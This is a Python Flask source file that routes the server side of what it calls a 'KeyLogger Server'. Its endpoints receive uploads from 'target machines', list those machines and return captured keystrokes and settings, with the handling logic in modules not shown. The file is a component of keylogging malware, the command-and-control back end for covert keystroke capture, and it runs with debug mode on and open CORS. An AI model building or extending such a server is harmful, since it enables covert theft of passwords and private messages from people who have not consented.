from flask import Flask, request
from flask_cors import CORS
from backend import controllers, services, utils

app = Flask(__name__)
CORS(app)

@app.get("/")
def home():
    return "KeyLogger Server is Running"

@app.post("/api/login")
def login():
    return controllers.handle_login(request)

@app.post("/api/notifications")
def notifications():
    return controllers.handle_notifications(request)

@app.get("/api/get_notifications")
def get_notifications():
    return controllers.handle_get_notifications()

@app.post("/api/delete_notification")
def delete_notifications():
    return controllers.handle_delete_notifications(request)

@app.post("/api/upload")
def upload():
    return controllers.handle_upload(request)

@app.get("/api/get_target_machines_list")
def get_machines():
    return controllers.handle_get_machines()

@app.get("/api/get_keystrokes")
def get_keystrokes():
    return controllers.handle_get_keystrokes(request)

@app.post("/api/update_settings")
def update_settings():
    return controllers.handle_update_settings(request)

@app.get("/api/get_settings")
def get_settings():
    return controllers.handle_get_settings()

if __name__ == "__main__":
    app.run(debug=True, port=5000)